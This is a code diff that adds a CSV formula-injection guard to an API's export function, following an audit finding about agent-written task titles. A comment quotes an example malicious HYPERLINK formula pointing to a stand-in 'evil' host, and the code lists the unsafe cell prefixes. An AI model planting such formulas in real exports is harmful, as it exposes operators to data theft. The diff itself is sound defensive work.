@@ -20,8 +20,42 @@ router = APIRouter()
 # ------------------------------------------------------------------
 
 
+# audit 11a F#5: CSV formula-injection guard.
+#
+# Excel, Google Sheets, LibreOffice, Numbers and friends all treat a cell
+# beginning with any of these prefixes as a formula and evaluate it on
+# open. A task title like ``=HYPERLINK("http://evil",A1)`` from a
+# compromised agent would trigger when an operator opens the CSV export.
+# The canonical mitigation (OWASP "CSV Injection") is to prefix a single
+# quote -- consuming tools strip it on display but formula parsers treat
+# the cell as plain text.
+_CSV_UNSAFE_PREFIXES = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _escape_csv_cell(value):
+    """Return *value* in a form safe to write to a CSV cell.
+
+    Strings starting with an unsafe prefix are escaped with a leading
+    single-quote. Non-string values pass through unchanged; CSV writers
+    stringify them without interpreting prefixes.
+    """
+    if isinstance(value, str) and value.startswith(_CSV_UNSAFE_PREFIXES):
+        return "'" + value
+    return value
+
+
+def _escape_row(row: dict) -> dict:
+    return {k: _escape_csv_cell(v) for k, v in row.items()}
+
+
 def _csv_response(rows: list[dict], filename: str) -> Response:
-    """Build a CSV download response from a list of dicts."""
+    """Build a CSV download response from a list of dicts.
+
+    All string cells beginning with ``= + - @ \\t \\r`` are escaped via
+    :func:`_escape_csv_cell` before writing, which prevents spreadsheet
+    formula injection from LLM-authored task titles / descriptions /
+    error messages landing in downloaded exports.
+    """
     if not rows:
         return Response(
             content="",
@@ -31,7 +65,7 @@ def _csv_response(rows: list[dict], filename: str) -> Response:
     output = io.StringIO()
     writer = csv.DictWriter(output, fieldnames=rows[0].keys())
     writer.writeheader()
-    writer.writerows(rows)
+    writer.writerows(_escape_row(r) for r in rows)
     return Response(
         content=output.getvalue(),
         media_type="text/csv",
